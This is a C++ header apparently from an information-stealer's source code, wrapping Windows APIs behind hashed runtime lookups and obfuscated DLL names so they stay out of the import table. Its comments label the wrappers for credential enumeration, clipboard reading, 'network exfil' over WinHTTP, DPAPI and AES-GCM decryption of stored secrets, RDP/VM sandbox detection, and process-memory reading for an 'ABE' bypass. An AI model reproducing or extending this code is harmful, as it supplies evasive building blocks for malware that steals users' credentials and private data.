#pragma once
//all functions here are resolved at runtime via api_hash, names never appear in the IAT
//no clue what iam even doing.
#include <windows.h>
#include <wincred.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <wtsapi32.h>
#include <obfuscation/api_hash.hpp>

namespace iat {

template<DWORD ModHash, DWORD FnHash, typename Sig>
struct _r {
    static Sig get() {
        static auto fn = (Sig)api_hash::get_proc(api_hash::get_module(ModHash), FnHash);
        return fn;
    }
};

template<DWORD ModHash, DWORD FnHash, typename Sig>
struct _rl {
    static Sig get(const char* dll_name) {
        static Sig fn = nullptr;
        if (!fn) {
            HMODULE m = api_hash::get_module(ModHash);
            if (!m) m = LoadLibraryA(dll_name);
            fn = (Sig)api_hash::get_proc(m, FnHash);
        }
        return fn;
    }
};

template<DWORD ModHash>
inline HMODULE _mod_lazy(const char* enc_name) {
    HMODULE h = api_hash::get_module(ModHash);
    if (!h) h = LoadLibraryA(enc_name);
    return h;
}

//shorthands
#define _I(mh, fn, sig) \
    _r<api_hash::hash(mh), api_hash::hash(fn), sig>::get()
#define _IL(mh, enc, fn, sig) \
    ((sig)api_hash::get_proc(_mod_lazy<api_hash::hash(mh)>(enc), api_hash::hash(fn)))

//advapi32 for credential management
inline BOOL cred_enumerate_a(LPCSTR f, DWORD fl, DWORD* c, PCREDENTIALA** cr) {
    return _I("advapi32.dll","CredEnumerateA",
        BOOL(WINAPI*)(LPCSTR,DWORD,DWORD*,PCREDENTIALA**))(f,fl,c,cr);
}
inline VOID cred_free(PVOID p) {
    _I("advapi32.dll","CredFree", VOID(WINAPI*)(PVOID))(p);
}

//user32 for clipboard
inline BOOL open_clipboard(HWND h) {
    return _I("user32.dll","OpenClipboard", BOOL(WINAPI*)(HWND))(h);
}
inline HANDLE get_clipboard_data(UINT f) {
    return _I("user32.dll","GetClipboardData", HANDLE(WINAPI*)(UINT))(f);
}
inline BOOL close_clipboard() {
    return _I("user32.dll","CloseClipboard", BOOL(WINAPI*)())(  );
}

//winhttp for network exfil (lazy loaded to not show up in import table.)
inline HINTERNET whttp_open(LPCWSTR a, DWORD b, LPCWSTR c, LPCWSTR d, DWORD e) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpOpen",
        HINTERNET(WINAPI*)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD))(a,b,c,d,e);
}
inline HINTERNET whttp_connect(HINTERNET h, LPCWSTR s, INTERNET_PORT p, DWORD r) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpConnect",
        HINTERNET(WINAPI*)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD))(h,s,p,r);
}
inline HINTERNET whttp_open_request(HINTERNET c, LPCWSTR v, LPCWSTR o,
                                    LPCWSTR v2, LPCWSTR r, LPCWSTR* a, DWORD f) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpOpenRequest",
        HINTERNET(WINAPI*)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD))(c,v,o,v2,r,a,f);
}
inline BOOL whttp_send_request(HINTERNET r, LPCWSTR h, DWORD hl,
                               LPVOID o, DWORD ol, DWORD tl, DWORD_PTR c) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpSendRequest",
        BOOL(WINAPI*)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR))(r,h,hl,o,ol,tl,c);
}
inline BOOL whttp_receive_response(HINTERNET r) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpReceiveResponse",
        BOOL(WINAPI*)(HINTERNET,LPVOID))(r, nullptr);
}
inline BOOL whttp_query_headers(HINTERNET r, DWORD i, LPCWSTR n,
                                LPVOID b, LPDWORD bl, LPDWORD idx) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpQueryHeaders",
        BOOL(WINAPI*)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD))(r,i,n,b,bl,idx);
}
inline BOOL whttp_add_request_headers(HINTERNET r, LPCWSTR h, DWORD hl, DWORD m) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpAddRequestHeaders",
        BOOL(WINAPI*)(HINTERNET,LPCWSTR,DWORD,DWORD))(r,h,hl,m);
}
inline BOOL whttp_set_option(HINTERNET h, DWORD o, LPVOID b, DWORD bl) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpSetOption",
        BOOL(WINAPI*)(HINTERNET,DWORD,LPVOID,DWORD))(h,o,b,bl);
}
inline BOOL whttp_query_data_available(HINTERNET r, LPDWORD n) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpQueryDataAvailable",
        BOOL(WINAPI*)(HINTERNET,LPDWORD))(r,n);
}
inline BOOL whttp_read_data(HINTERNET r, LPVOID b, DWORD n, LPDWORD rd) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpReadData",
        BOOL(WINAPI*)(HINTERNET,LPVOID,DWORD,LPDWORD))(r,b,n,rd);
}
inline BOOL whttp_close_handle(HINTERNET h) {
    static const char _dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    return _IL("winhttp.dll",_dll,"WinHttpCloseHandle",
        BOOL(WINAPI*)(HINTERNET))(h);
}

//bcrypt.dll for AES-GCM decryption 
inline NTSTATUS bcrypt_open_algo(PVOID* phAlg, LPCWSTR algId, LPCWSTR impl, ULONG flags) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptOpenAlgorithmProvider");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID*,LPCWSTR,LPCWSTR,ULONG)>::get(_b)(phAlg,algId,impl,flags);
}
inline NTSTATUS bcrypt_set_property(PVOID hObj, LPCWSTR prop, PUCHAR pbIn, ULONG cbIn, ULONG flags) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptSetProperty");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID,LPCWSTR,PUCHAR,ULONG,ULONG)>::get(_b)(hObj,prop,pbIn,cbIn,flags);
}
inline NTSTATUS bcrypt_gen_sym_key(PVOID hAlg, PVOID* phKey, PUCHAR pbKeyObj, ULONG cbKeyObj,
                                   PUCHAR pbSecret, ULONG cbSecret, ULONG flags) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptGenerateSymmetricKey");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID,PVOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG)>::get(_b)(
        hAlg,phKey,pbKeyObj,cbKeyObj,pbSecret,cbSecret,flags);
}
inline NTSTATUS bcrypt_decrypt(PVOID hKey, PUCHAR pbIn, ULONG cbIn, VOID* pPad,
                               PUCHAR pbIV, ULONG cbIV, PUCHAR pbOut, ULONG cbOut,
                               ULONG* pcbResult, ULONG flags) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptDecrypt");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID,PUCHAR,ULONG,VOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG)>::get(_b)(
        hKey,pbIn,cbIn,pPad,pbIV,cbIV,pbOut,cbOut,pcbResult,flags);
}
inline NTSTATUS bcrypt_destroy_key(PVOID hKey) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptDestroyKey");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID)>::get(_b)(hKey);
}
inline NTSTATUS bcrypt_close_algo(PVOID hAlg, ULONG flags) {
    static const char _b[] = {'b','c','r','y','p','t','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"bcrypt.dll");
    constexpr DWORD fh = api_hash::hash("BCryptCloseAlgorithmProvider");
    return _rl<mh,fh,NTSTATUS(WINAPI*)(PVOID,ULONG)>::get(_b)(hAlg,flags);
}

//crypt32.dll for DPAPI
inline BOOL crypt_unprotect_data(DATA_BLOB* pIn, LPWSTR* ppDesc, DATA_BLOB* pEntropy,
                                  PVOID pReserved, CRYPTPROTECT_PROMPTSTRUCT* pPrompt,
                                  DWORD dwFlags, DATA_BLOB* pOut) {
    static const char _c[] = {'c','r','y','p','t','3','2','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"crypt32.dll");
    constexpr DWORD fh = api_hash::hash("CryptUnprotectData");
    using Fn = BOOL(WINAPI*)(DATA_BLOB*,LPWSTR*,DATA_BLOB*,PVOID,CRYPTPROTECT_PROMPTSTRUCT*,DWORD,DATA_BLOB*);
    return _rl<mh,fh,Fn>::get(_c)(pIn,ppDesc,pEntropy,pReserved,pPrompt,dwFlags,pOut);
}

//wtsapi32.dll session info for RDP/VM detection
inline BOOL wts_query_session_info(HANDLE hServer, DWORD sessionId,
                                    WTS_INFO_CLASS cls, LPWSTR* ppBuf, DWORD* pBytes) {
    static const char _w[] = {'w','t','s','a','p','i','3','2','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"wtsapi32.dll");
    constexpr DWORD fh = api_hash::hash("WTSQuerySessionInformationW");
    using Fn = BOOL(WINAPI*)(HANDLE,DWORD,WTS_INFO_CLASS,LPWSTR*,DWORD*);
    return _rl<mh,fh,Fn>::get(_w)(hServer,sessionId,cls,ppBuf,pBytes);
}
inline VOID wts_free_memory(PVOID p) {
    static const char _w[] = {'w','t','s','a','p','i','3','2','.','d','l','l',0};
    constexpr DWORD mh = api_hash::hash(L"wtsapi32.dll");
    constexpr DWORD fh = api_hash::hash("WTSFreeMemory");
    _rl<mh,fh,VOID(WINAPI*)(PVOID)>::get(_w)(p);
}

//kernel32 debug APIs used in ABE stuff
inline BOOL read_process_mem(HANDLE h, LPCVOID base, LPVOID buf, SIZE_T n, SIZE_T* rd) {
    return _I("kernel32.dll","ReadProcessMemory",
        BOOL(WINAPI*)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*))(h,base,buf,n,rd);
}
inline BOOL dbg_active_proc(DWORD pid) {
    return _I("kernel32.dll","DebugActiveProcess", BOOL(WINAPI*)(DWORD))(pid);
}
inline BOOL dbg_active_proc_stop(DWORD pid) {
    return _I("kernel32.dll","DebugActiveProcessStop", BOOL(WINAPI*)(DWORD))(pid);
}
inline BOOL wait_dbg_event(LPDEBUG_EVENT ev, DWORD ms) {
    return _I("kernel32.dll","WaitForDebugEvent",
        BOOL(WINAPI*)(LPDEBUG_EVENT,DWORD))(ev,ms);
}
inline BOOL cont_dbg_event(DWORD pid, DWORD tid, DWORD status) {
    return _I("kernel32.dll","ContinueDebugEvent",
        BOOL(WINAPI*)(DWORD,DWORD,DWORD))(pid,tid,status);
}

#undef _I
#undef _IL

} //namespace iat
